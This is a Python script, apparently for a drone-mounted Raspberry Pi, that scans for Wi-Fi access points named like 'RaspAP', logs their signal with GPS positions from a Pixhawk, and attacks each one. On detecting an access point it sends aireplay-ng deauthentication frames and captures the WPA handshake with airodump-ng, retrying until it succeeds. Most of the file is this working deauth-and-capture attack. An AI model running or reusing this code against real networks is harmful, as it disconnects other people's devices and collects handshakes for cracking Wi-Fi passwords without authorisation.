import subprocess
import csv
import os
import signal
import time
from datetime import datetime
import sys
import re
import select
from pymavlink import mavutil

# === CONFIGURATION ===
current_datetime = datetime.now().strftime("%Y%m%d%H%M%S")
CAPTURE_DIR = f"/home/pi/mavenv/scripts/captures/capture_{current_datetime}"
os.makedirs(CAPTURE_DIR, exist_ok=True)
CSV_FILE = f"{CAPTURE_DIR}/gps_scan-01.csv"
INTERFACE = "wlan1mon"
BASE_INTERFACE = "wlan1"
MAVLINK_PORT = "/dev/ttyACM0"  # or /dev/serial0 for UART
BAUD_RATE = 57600
OUTPUT_DURATION = 30  # seconds
LOG_FILE = f"{CAPTURE_DIR}/wifi_gps_log.csv"
ESSID_REGEX = r"RaspAP"
VISIBLE_TIMEOUT = 8
RESTART_TIMEOUT = 20
skip_gps = False


if len(sys.argv) > 1:
    OUTPUT_DURATION = int(sys.argv[1])
if len(sys.argv) > 2:
    if int(sys.argv[2]) == 1:
        skip_gps = True


# === IN-MEMORY DATA STRUCTURES ===
currently_visible_aps = {}   # snapshot of what is visible right now, keyed by BSSID
all_seen_aps = {}            # everything seen during this run, keyed by BSSID
seen_bssids = set()          # used to trigger "new AP" detection only once
capture_proc = None
new_ap_detected = False
new_ap_info = None

# === MAVLINK CONNECTION ===
print("Connecting to Pixhawk...")
mav = mavutil.mavlink_connection(MAVLINK_PORT, baud=BAUD_RATE)
mav.wait_heartbeat()
print("Pixhawk connected.")

def wait_for_gps(mav, min_fix_type=2, min_sats=4, timeout=20):
    if skip_gps:
        return True
    start = time.time()
    print(f"Waiting for GPS fix >= {min_fix_type} with >= {min_sats} satellites...")

    while time.time() - start < timeout:
        msg = mav.recv_match(type='GPS_RAW_INT', blocking=True, timeout=1)
        if not msg:
            continue

        ft = msg.fix_type
        sats = msg.satellites_visible
        print(f"Fix {ft}, Sats {sats}")

        if ft >= min_fix_type and sats >= min_sats:
            print("GPS lock acquired")
            return True

    print(f"Timeout ({timeout}s) getting GPS fix.")
    return False

def get_gps():
    gps = mav.recv_match(type="GPS_RAW_INT", blocking=True, timeout=2)
    if gps:
        lat = gps.lat / 1e7
        lon = gps.lon / 1e7
        alt = gps.alt / 1000.0
        return (lat, lon, alt)
    if skip_gps: return (0,0,0)
    return (None, None, None)

def ensure_csv_header(path, header):
    if not os.path.exists(path) or os.path.getsize(path) == 0:
        with open(path, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(header)

def parse_airodump_csv(csv_path):
    global seen_aps
    """
    Parse the AP section of airodump-ng CSV into a dict keyed by BSSID.
    Only returns APs whose ESSID matches ESSID_REGEX.
    """
    aps = {}

    if not os.path.exists(csv_path):
        return aps

    with open(csv_path, newline='') as f:
        reader = csv.reader(f)
        for row in reader:
            if not row:
                continue

            first_col = row[0].strip()

            # Skip AP header line and stop when station section begins
            if first_col == "BSSID":
                continue
            if first_col == "Station MAC":
                break

            # AP rows should have enough columns for ESSID at index 13
            if len(row) < 14:
                continue

            bssid = row[0].strip()
            first_seen = row[1].strip()
            last_seen = row[2].strip()
            channel = row[3].strip()
            speed = row[4].strip()
            privacy = row[5].strip()
            cipher = row[6].strip()
            auth = row[7].strip()
            power = row[8].strip()
            beacons = row[9].strip()
            iv = row[10].strip()
            lan_ip = row[11].strip()
            essid = row[13].strip()

            if not bssid or not essid:
                continue

            if not re.search(ESSID_REGEX, essid):
                continue

            aps[bssid] = {
                "essid": essid,
                "bssid": bssid,
                "channel": channel,
                "speed": speed,
                "privacy": privacy,
                "cipher": cipher,
                "auth": auth,
                "power": power,
                "beacons": beacons,
                "iv": iv,
                "lan_ip": lan_ip,
                "first_seen": first_seen,
                "last_seen": last_seen
            }

    return aps


def print_ap_info(ap):
    print("ESSID:", ap["essid"])
    print("BSSID:", ap["bssid"])
    print("Last Capture Attempt:", ap["last_attempt"])
    print("Captured:", ap["captured"])

def update_all_seen_aps(snapshot, lat, lon, alt, timestamp):
    global all_seen_aps
    for bssid, ap in snapshot.items():
        if bssid not in all_seen_aps:
            all_seen_aps[bssid] = {
                "essid": ap["essid"],
                "bssid": bssid,
                "first_seen": timestamp,
                "last_seen": timestamp,
                "strongest_power": ap["power"],
                "last_power": ap["power"],
                "first_lat": lat,
                "first_lon": lon,
                "first_alt": alt,
                "last_lat": lat,
                "last_lon": lon,
                "last_alt": alt,
                "channel": ap["channel"],
                "privacy": ap["privacy"],
                "cipher": ap["cipher"],
                "auth": ap["auth"],
            }
        else:
            entry = all_seen_aps[bssid]
            entry["essid"] = ap["essid"]
            entry["last_seen"] = timestamp
            entry["last_power"] = ap["power"]
            entry["last_lat"] = lat
            entry["last_lon"] = lon
            entry["last_alt"] = alt
            entry["channel"] = ap["channel"]
            entry["privacy"] = ap["privacy"]
            entry["cipher"] = ap["cipher"]
            entry["auth"] = ap["auth"],
            try:
                entry["last_attempt"] = ap["last_attempt"]
                entry["captured"] = ap["captured"]
                if int(ap["power"]) > int(entry["strongest_power"]):
                    entry["strongest_power"] = ap["power"]
            except (ValueError, KeyError):
                pass


def read_available_line(scan_proc, timeout=0.2):
    if scan_proc is None or scan_proc.stdout is None:
        return None

    ready, _, _ = select.select([scan_proc.stdout], [], [], timeout)
    if ready:
        line = scan_proc.stdout.readline()
        if line:
            return line.strip()
    return None


def trigger_deauth(bssid):
    subprocess.run(["/usr/sbin/iw", "dev", INTERFACE, "set", "channel", "1"])
    time.sleep(0.5)
    subprocess.run([
        "/usr/sbin/aireplay-ng",
        "--deauth", "5",
        "-a", bssid,
        INTERFACE
    ])

def start_handshake_capture(ap, timeout_seconds=8):
    global capture_proc
    global scan_proc
    if scan_proc is not None and scan_proc.poll() is None:
        scan_proc.send_signal(signal.SIGINT)
    if capture_proc is not None and capture_proc.poll() is None:
        print("Capture already running.")
        return

    print(f"Starting handshake capture for {ap['bssid']} on channel {ap['channel']}")
    essid = ap['essid'] or "hidden"
    safe_essid = re.sub(r'[^A-Za-z0-9_-]', '_', essid)
    safe_bssid = ap['bssid'].replace(":", "")

    filename = f"{CAPTURE_DIR}/{safe_essid}_{safe_bssid}_handshake_capture"
    logname = f"{CAPTURE_DIR}/{safe_essid}_capture_output.log"
    with open(logname, 'w') as f:
        capture_proc = subprocess.Popen([
            "/usr/sbin/airodump-ng",
            "--bssid", ap['bssid'],
            "-c", "1",
            "-w", filename,
            INTERFACE
            ],
            stdout=f,
            stderr=f,
            text=True,
            bufsize=1)
        time.sleep(1)
    trigger_deauth(ap['bssid'])
    start_time = time.time()
    try:
        while True:
            if time.time() - start_time > timeout_seconds:
                print("Capture timed out.")
                break
            if capture_proc.poll() is not None:
                print("Capture process exited.")
                break

    finally:
        stop_capture()
        restart_scan()
        time.sleep(0.5)
    success = False
    with open(logname, 'r') as f:
        content = f.read()
        if content and "WPA handshake" in content:
            print("Capture successful")
            success = True
    return success

def stop_capture():
    global capture_proc

    if capture_proc is None:
        return

    if capture_proc.poll() is None:
        try:
            capture_proc.send_signal(signal.SIGINT)
            capture_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            capture_proc.kill()
            capture_proc.wait()

    capture_proc = None
    print("Capture stopped.")

def restart_scan():
    global scan_proc
    if scan_proc.poll() is None:
        try:
            scan_proc.send_signal(signal.SIGINT)
            scan_proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            scan_proc.kill()
            scan_proc.wait()
    scan_proc = start_scan()


def handle_new_ap(ap, lat, lon, alt, timestamp):
    """
    This is where the 'flag' is raised.
    Replace the placeholder section with whatever action you eventually want.
    """
    global new_ap_detected, new_ap_info

    new_ap_detected = True
    new_ap_info = {
        "timestamp": timestamp,
        "essid": ap["essid"],
        "bssid": ap["bssid"],
        "power": ap["power"],
        "channel": ap["channel"],
        "lat": lat,
        "lon": lon,
        "alt": alt
    }

    print("\n=== NEW AP DETECTED ===")
    print(f"ESSID: {ap['essid']}")
    print(f"BSSID: {ap['bssid']}")
    print(f"Power: {ap['power']} dBm")
    print(f"Channel: {ap['channel']}")
    print(f"GPS: {lat}, {lon}, {alt}")
    print("=======================\n")

    ap["last_attempt"] = timestamp
    ap["cooldown"] = 10
    ap["captured"] = start_handshake_capture(ap)
    return ap

def process_live_stdout_line(line):
    """
    Optional live parser hook.
    For reliability, the real source of truth remains the CSV snapshot,
    but this lets you inspect airodump output in real time if desired.
    """
    line = line.strip()
    if line:
        print(f"[airodump] {line}")


def ap_recently_seen(ap, timeout_seconds=8):
    try:
        last_seen_dt = datetime.strptime(ap["last_seen"], "%Y-%m-%d %H:%M:%S")
        age = time.time() - last_seen_dt.timestamp()
        return age <= timeout_seconds
    except Exception:
        return False

# === CLEAN OLD CSV FILES ===
def delete_old_scan():
    for file in os.listdir(CAPTURE_DIR):
        if file.startswith("gps_scan-") and file.endswith(".csv"):
            os.remove(f"{CAPTURE_DIR}/" + file)


# === CHECK GPS FIX ===
if not wait_for_gps(mav, min_fix_type=2, min_sats=5):
    print("Could not get adequate GPS fix - exiting.")
    sys.exit(1)

# === PREPARE LOG FILE ===
ensure_csv_header(
    LOG_FILE,
    ["Timestamp", "ESSID", "BSSID", "Signal", "Latitude", "Longitude", "Altitude"]
)

# === START MONITOR MODE ===
print(f"Starting monitor mode on {BASE_INTERFACE}...")
monitor_proc = subprocess.Popen(
    ["sudo", "airmon-ng", "start", BASE_INTERFACE, "1"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL
)
monitor_proc.wait()

# === START AIRODUMP-NG ===
print("Starting airodump-ng...")
def start_scan():
    global scan_start_time
    scan_start_time = time.time()
    delete_old_scan()
    with open(f"{CAPTURE_DIR}/Dump.log","w") as f:
        return subprocess.Popen(
            [
                "/usr/sbin/airodump-ng",
                "--write", f"{CAPTURE_DIR}/gps_scan",
                "--output-format", "csv",
                "--write-interval", "1",
                "-c", "1",
                "--essid-regex", ESSID_REGEX,
                INTERFACE
            ],
            stdout=f,
            stderr=f,
            text=True,
            bufsize=1
        )
scan_start_time = 0
scan_proc = start_scan()
# === MAIN LOOP ===
start_time = time.time()
print("Collecting data...")
seen_aps = {}
previous_visible_bssids = set()
with open(LOG_FILE, "a", newline='') as logfile:
    writer = csv.writer(logfile)
    try:
        while time.time() - start_time < OUTPUT_DURATION or OUTPUT_DURATION == -1:
            if time.time() - scan_start_time >= 15:
                restart_scan()
            try:
                snapshot = parse_airodump_csv(CSV_FILE)
            except Exception as e:
                print(f"Error parsing CSV: {e}")
                snapshot = {}
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            lat, lon, alt = get_gps()
            pruned_snapshot = {}
            for i in snapshot.values():
                if ap_recently_seen(i):
                    pruned_snapshot[i["bssid"]] = i
            # Replace current visibility snapshot
            currently_visible_aps = pruned_snapshot if time.time() - scan_start_time < 10 else previously_visible_aps
            current_visible_bssids = set(currently_visible_aps.keys())
            # Detect newly appeared APs in current visibility snapshot
            appeared_bssids = current_visible_bssids - previous_visible_bssids
            disappeared_bssids = previous_visible_bssids - current_visible_bssids
            new_ap = False
            for bssid in appeared_bssids:
                ap = currently_visible_aps[bssid]
                # One-time-ever detection for this run
                if bssid not in seen_bssids:
                    seen_bssids.add(bssid)
                    currently_visible_aps[bssid] = handle_new_ap(ap, lat, lon, alt, timestamp)
                    all_seen_aps[bssid] = currently_visible_aps[bssid]
                    new_ap = True
                else:
                    ap = all_seen_aps[bssid]
                    if not ap or time.time() - scan_start_time < 2:
                        continue
                    if not ap.get("captured", False):
                        if time.time() - datetime.strptime(ap["last_attempt"], "%Y-%m-%d %H:%M:%S").timestamp() > ap["cooldown"] and not ap["captured"]:
                            print("Failed capture detected. Retrying.")
                            ap["last_attempt"] = timestamp
                            ap["cooldown"] = 10
                            ap["captured"] = start_handshake_capture(ap)

            for bssid in disappeared_bssids:
                ap = all_seen_aps.get(bssid, {"essid": "Unknown"})
                print(f"[LOST] {ap['essid']} ({bssid})")
            if not new_ap:
                for bssid in current_visible_bssids:
                    ap = all_seen_aps.get(bssid, {"essid": "Unknown"})
                    if time.time() - datetime.strptime(ap["last_attempt"], "%Y-%m-%d %H:%M:%S").timestamp() > ap["cooldown"] and not ap["captured"]:
                        print("Failed capture detected. Retrying.")
                        ap["last_attempt"] = timestamp
                        ap["cooldown"] += 5 if ap["cooldown"] < 30 else 0
                        ap["captured"] = start_handshake_capture(ap)
            for i in current_visible_bssids:
                print_ap_info(all_seen_aps[i])
            # Update long-term record
            update_all_seen_aps(currently_visible_aps, lat, lon, alt, timestamp)
            # Continue writing heatmap observations
            if lat is not None:
                for bssid, ap in currently_visible_aps.items():
                    writer.writerow([
                        timestamp,
                        ap["essid"],
                        bssid,
                        ap["power"],
                        lat,
                        lon,
                        alt
                    ])
                logfile.flush()

            previous_visible_bssids = current_visible_bssids
            previously_visible_aps = currently_visible_aps
            time.sleep(0.2)

# === CLEAN UP ===
    finally:
        print("Stopping airodump-ng...")
        stop_capture()
        if scan_proc is not None and scan_proc.poll() is None:
            scan_proc.send_signal(signal.SIGINT)
            scan_proc.wait()

        print(f"Logged data to {LOG_FILE}")
        print(f"Total APs seen this run: {len(all_seen_aps)}")
